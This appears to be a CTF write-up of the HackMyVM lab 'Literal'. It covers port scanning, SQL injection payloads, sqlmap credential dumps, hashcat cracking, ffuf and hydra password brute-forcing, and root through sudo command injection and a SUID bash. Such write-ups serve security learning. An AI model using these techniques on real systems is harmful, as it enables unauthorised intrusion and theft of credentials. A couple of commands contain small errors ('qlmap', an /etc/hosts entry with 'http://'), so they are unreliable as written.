---
{"dg-publish":true,"permalink":"/write-ups/hack-my-vm/literal/","tags":["CTF","write-up"]}
---


![Pasted image 20251010174532.png|200](/img/user/attachments/Pasted%20image%2020251010174532.png)

---

> [!INFO] Info about Literal
>  Try it with OSCP style. Thanks for play (:

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

---
# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
## Port 22 - SSH
22/tcp open  ssh     **OpenSSH 8.2p1** Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
## Port 80 - Apache
80/tcp open  http    **Apache** httpd **2.4.41**
http-title: Did not follow redirect to http://blog.literal.hmv
http-server-header: Apache/2.4.41 (Ubuntu)

> [!NOTE] Add the redirect link to etc hosts
> ```shell
sudo echo "TARGET_IP http://blog.literal.hmv" | sudo tee -a /etc/hosts
>```

![Pasted image 20251010182740.png|700](/img/user/attachments/Pasted%20image%2020251010182740.png)

Run [[whatweb\|whatweb]]
```shell
whatweb http://blog.literal.hmv/
```
We got an email carlos@literal.hmv

Checking the web page source
```shell
TEMPLATED
http://templated.co
```
### Login.php
http://blog.literal.hmv/login.php
![Pasted image 20251010201221.png|700](/img/user/attachments/Pasted%20image%2020251010201221.png)
We can sign up
### Register.php
![Pasted image 20251010201343.png|700](/img/user/attachments/Pasted%20image%2020251010201343.png)
 Then, login, and we are on the website
### Dashboard.php
![Pasted image 20251010201522.png|700](/img/user/attachments/Pasted%20image%2020251010201522.png)
### next_projects_to_do.php
![Pasted image 20251010201945.png|700](/img/user/attachments/Pasted%20image%2020251010201945.png)

---
# Vulnerability analysis
## User enumeration
Based in the email found before iI tried to enum usernames and it works, the page show me if a username is already taken
 ![Pasted image 20251019203720.png](/img/user/attachments/Pasted%20image%2020251019203720.png)
## Test In-Band SQLi
On the directory `next_projects_to_do.php`
Simply searching "doing" the search works
![Pasted image 20251019182538.png](/img/user/attachments/Pasted%20image%2020251019182538.png)
Testing single quote and double quote don't work. No error
![Pasted image 20251019182715.png](/img/user/attachments/Pasted%20image%2020251019182715.png)
But works with `doing' -- -`
We don't have an [[Error-Based SQL Injection\|Error-Based SQL Injection]] 
![Pasted image 20251019182857.png](/img/user/attachments/Pasted%20image%2020251019182857.png)
This means that `' -- -` is not being filtering and pass the filter
I tried `doing' and sleep(5)-- -` but time to sleep is longer that 5 seconds and the request is not working
![Pasted image 20251019183314.png](/img/user/attachments/Pasted%20image%2020251019183314.png)
I'm going to try directly `order by`
After testing I found the column number
![Pasted image 20251019184001.png](/img/user/attachments/Pasted%20image%2020251019184001.png)
The site is vulnerable, I'm going to exploit later

---
# Exploitation

## User enumeration
After tried manually I have at teast two usernames. `carlos` and `admin`
## Password attack
I tried to found the password to login in the webpage to the username `carlos` using [[ffuf\|ffuf]] and `rockyou`
```shell
ffuf -c -t 100 -w /usr/share/wordlists/rockyou.txt:W1 -X POST -d "username=carlos&password=W1" -H "Content-Type: application/x-www-form-urlencoded" -u http://blog.literal.hmv/login.php -mc 302
```
![Pasted image 20251019204255.png](/img/user/attachments/Pasted%20image%2020251019204255.png)
After getting the password I logged as `carlos` but I didn't see differences in the webpage, so, stopped to get more user or password through this attack vector.
## Exploiting SQLi with SQLmap
To exploit the **In-Band SQLi**, *copy to file* to use it with **SQLmap**
![Pasted image 20251019203038.png](/img/user/attachments/Pasted%20image%2020251019203038.png)
Dump data
```shell
sqlmap -r cap3 -p sentence-query --cookie="PHPSESSID=75865votpo1u2k8mg7tt0srtf2" --risk=3 --dump
```
We have users and their hashes
![Pasted image 20251019203231.png](/img/user/attachments/Pasted%20image%2020251019203231.png)
Two users have a different subdomain of literal.
![Pasted image 20251120203244.png](/img/user/attachments/Pasted%20image%2020251120203244.png)
Furthermore I got the database management *system users* password hashes
![Pasted image 20251020210615.png](/img/user/attachments/Pasted%20image%2020251020210615.png)

**MySQL 8**
Furthermore, I got that information from the results
```
From SQLmap
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 8
banner: '8.0.42-0ubuntu0.20.04.1'
current user: 'carlos@localhost'
current database: 'blog'
hostname: 'literal'
current user is DBA: False
database management system users [7]:
```

> [!Important] System user name
> *carlos* is a username

## Subdomain found
Add the subdomain *forumtesting* of the two different accounts to `/etc/hosts`
![Pasted image 20251120203851.png](/img/user/attachments/Pasted%20image%2020251120203851.png)
And it works, the subdomain exists
![Pasted image 20251120204027.png](/img/user/attachments/Pasted%20image%2020251120204027.png)
There are two panels of auth.
Normal 
http://forumtesting.literal.hmv/login.php
![Pasted image 20251130233216.png|500](/img/user/attachments/Pasted%20image%2020251130233216.png)
Admin
http://forumtesting.literal.hmv/CP_login.php
![Pasted image 20251130233250.png|500](/img/user/attachments/Pasted%20image%2020251130233250.png)
I found a page to test SQLi:
http://forumtesting.literal.hmv/category.php?category_id=2
![Pasted image 20251130233405.png](/img/user/attachments/Pasted%20image%2020251130233405.png)
### SQLi
I test the page, and it's vulnerable to *Blind-interferral SQLi* 
Query: `http://forumtesting.literal.hmv/category.php?category_id=2 and sleep(5)-- -`
![Pasted image 20251130233824.png](/img/user/attachments/Pasted%20image%2020251130233824.png)
Or on the browser
![Pasted image 20251130233855.png](/img/user/attachments/Pasted%20image%2020251130233855.png)
In both cases the webpage load after 5 seconds meaning that the SQLi was successfully
#### SQLMap
To get the info from the DB, use SQLMap
```shell
qlmap -u http://forumtesting.literal.hmv/category.php?category_id=2 --dbs --risk=3 --level=5 --cookie="PHPSESSID=lh6oor57ceqrjrq45lnemd8nuj"
```
DB names:
![Pasted image 20251130234143.png](/img/user/attachments/Pasted%20image%2020251130234143.png)
In `forumtesting` DB are credentials
![Pasted image 20251130234941.png](/img/user/attachments/Pasted%20image%2020251130234941.png)
#### Crack the hash
I cracked the hash using `hashcat` with a dGPU, for example:
```shell
hashcat -m 1700 -D 2 -O -w 3 carlos_forum_hash /usr/share/wordlists/rockyou.txt
```

![Pasted image 20251201000317.png|600](/img/user/attachments/Pasted%20image%2020251201000317.png)
Show the password adding `--show`
![Pasted image 20251201000509.png](/img/user/attachments/Pasted%20image%2020251201000509.png)
## Dictionary attack
I tried to login on the authentications panels of `forumtesting` and doesn't work.
We known that a username `carlos` exists like a DB system user, so I tried to login through SSH but doesn't work.
The last password found has a *chars* part and a *numerical* part, I tried a combination of that number with a relatively short and common wordlist.

Create a new wordlist, appending the numerical part to the wordlist
```shell
ttpassgen --dictlist /usr/share/wordlists/dirb/common.txt --rule '$01....89' common_n.txt
```

Try to login on SSH service
```shell
hydra -f -V -t 64 -l carlos -P common_n.txt 192.168.122.52 ssh
```
![Pasted image 20251202001237.png|700](/img/user/attachments/Pasted%20image%2020251202001237.png)

Now login with the found credentials
![Pasted image 20251202001539.png|700](/img/user/attachments/Pasted%20image%2020251202001539.png)

> [!check] User flag
> ![Pasted image 20251202001812.png](/img/user/attachments/Pasted%20image%2020251202001812.png)

---
# Privilege escalation
## Sudo -l
Check *sudo* permission
![Pasted image 20251202092417.png](/img/user/attachments/Pasted%20image%2020251202092417.png)
The file uses arguments and we can try a command injection. After some attempts I got it
![Pasted image 20251202211304.png|700](/img/user/attachments/Pasted%20image%2020251202211304.png)
I can execute command as root

I tried to execute a bash, but I don't have output.
![Pasted image 20251202212601.png](/img/user/attachments/Pasted%20image%2020251202212601.png)

With the capability to execute commands as root, among many ways to exploit this, I'm going to try to copy the bash file and add SUID to it
![Pasted image 20251202213256.png](/img/user/attachments/Pasted%20image%2020251202213256.png)
Now execute the `bash2`file
![Pasted image 20251202213402.png|400](/img/user/attachments/Pasted%20image%2020251202213402.png)

> [!check] Root flag
> ![Pasted image 20251202204350.png|400](/img/user/attachments/Pasted%20image%2020251202204350.png)
